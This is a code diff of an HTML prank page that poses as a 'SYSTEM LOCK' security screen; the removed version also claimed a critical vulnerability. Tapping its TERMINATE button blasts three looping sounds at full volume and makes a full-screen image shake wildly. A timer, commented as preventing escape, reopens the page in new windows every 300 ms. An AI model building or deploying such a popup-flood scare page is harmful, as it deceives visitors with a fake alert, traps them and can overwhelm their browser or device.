@@ -3,72 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>☠️ SYSTEM FAILURE ☠️</title>
+    <title>☠️ SYSTEM_HALT ☠️</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
-        #madImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 10; display: none; will-change: transform; }
-        #ui { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: flex; flex-direction: column; justify-content: center; align-items: center; font-family: monospace; color: #f00; text-align: center; }
-        .btn-red { background: #f00; color: #000; border: none; width: 260px; height: 90px; font-weight: bold; font-size: 26px; cursor: pointer; margin-top: 30px; box-shadow: 0 0 25px #f00; }
-        .blink { animation: b 0.1s infinite; }
-        @keyframes b { 50% { opacity: 0; } }
+        
+        /* صورة المرأة: تعمر الشاشة ومستعدة للهبال سواسوة */
+        #madImg { 
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
+            object-fit: cover; z-index: 10; display: none;
+            will-change: transform;
+        }
+
+        /* واجهة الزر الأحمر سواسوة */
+        #ui { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: #000; z-index: 1000; display: flex; 
+            flex-direction: column; justify-content: center; align-items: center;
+            font-family: monospace; color: #f00; text-align: center;
+        }
+        .btn-red { 
+            background: #f00; color: #000; border: none; width: 260px; height: 90px;
+            font-weight: bold; font-size: 26px; cursor: pointer; margin-top: 30px;
+            box-shadow: 0 0 25px #f00;
+        }
+
+        /* كود الأنيميشن (التخبيط) سواسوة */
+        @keyframes jitter {
+            0% { transform: translate(0,0) rotate(0deg) scale(1); }
+            10% { transform: translate(-8px, -12px) rotate(-4deg) scale(1.1); }
+            20% { transform: translate(12px, 8px) rotate(4deg) scale(1.05); }
+            30% { transform: translate(-15px, 5px) rotate(-6deg) scale(1.15); }
+            40% { transform: translate(15px, -8px) rotate(6deg) scale(1.1); }
+            50% { transform: translate(-10px, 15px) rotate(-3deg) scale(1.2); }
+            60% { transform: translate(18px, -15px) rotate(5deg) scale(1.1); }
+            70% { transform: translate(-20px, 10px) rotate(-7deg) scale(1.25); }
+            80% { transform: translate(10px, -18px) rotate(4deg) scale(1.15); }
+            90% { transform: translate(-5px, 12px) rotate(-2deg) scale(1.1); }
+            100% { transform: translate(0,0) rotate(0deg) scale(1.1); }
+        }
+
+        .active-madness {
+            display: block !important;
+            animation: jitter 0.08s infinite linear; /* سرعة فائقة للتخبيط سواسوة */
+        }
     </style>
 </head>
 <body>
 
     <div id="ui">
-        <h1 class="blink" style="font-size: 45px;">☠️ SYSTEM LOCK ☠️</h1>
-        <p style="font-size: 18px;">Critical vulnerability detected.<br>Tap to terminate and secure data.</p>
-        <button class="btn-red" onclick="igniteFinalChaos()">TERMINATE</button>
+        <h1 style="font-size: 40px; animation: blink 0.1s infinite;">☠️ SYSTEM LOCK ☠️</h1>
+        <button class="btn-red" onclick="startGlobalChaos()">TERMINATE</button>
     </div>
 
     <img id="madImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
-    <div id="audioVault">
+    <div id="sounds">
         <audio class="t" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3"></audio>
         <audio class="t" loop><source src="https://www.myinstants.com/media/sounds/chicken-on-tree-screaming.mp3"></audio>
         <audio class="t" loop><source src="https://www.myinstants.com/media/sounds/dzonza.mp3"></audio>
     </div>
 
     <script>
-        let aCtx, analyser, data;
-        const img = document.getElementById('madImg');
+        function startGlobalChaos() {
+            // 1. إطلاق الأصوات الـ 3 فوراً سواسوة
+            const audios = document.querySelectorAll('.t');
+            audios.forEach(a => { a.volume = 1.0; a.play(); });
 
-        function igniteFinalChaos() {
-            const tracks = document.querySelectorAll('.t');
-            tracks.forEach(t => { t.volume = 1.0; t.play(); }); // نفس النسبة سواسوة
-
+            // 2. تفعيل التخبيط البصري المستقل سواسوة
             document.getElementById('ui').style.display = 'none';
-            img.style.display = 'block';
-            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+            document.getElementById('madImg').classList.add('active-madness');
 
-            if (!aCtx) {
-                aCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const source = aCtx.createMediaElementSource(tracks[1]); 
-                analyser = aCtx.createAnalyser();
-                analyser.fftSize = 64;
-                data = new Uint8Array(analyser.frequencyBinCount);
-                source.connect(analyser);
-                analyser.connect(aCtx.destination);
-                if (aCtx.state === 'suspended') aCtx.resume();
-                renderMadness();
-            }
-
+            // 3. منع الهروب سواسوة
             setInterval(() => {
                 window.open(window.location.href, '_blank', 'width=10,height=10');
-            }, 250);
-        }
-
-        function renderMadness() {
-            analyser.getByteFrequencyData(data);
-            let vol = data[0]; 
-            const power = (vol / 255) * 110; // قوة التخبيط القصوى
-            const x = (Math.random() - 0.5) * power * 8;
-            const y = (Math.random() - 0.5) * power * 8;
-            const r = (Math.random() - 0.5) * power;
-            const s = 1 + (vol / 255) * 0.8;
-            img.style.transform = `translate(${x}px, ${y}px) rotate(${r}deg) scale(${s})`;
-            requestAnimationFrame(renderMadness);
+            }, 300);
         }
     </script>
+    <style> @keyframes blink { 50% { opacity: 0; } } </style>
 </body>
 </html>
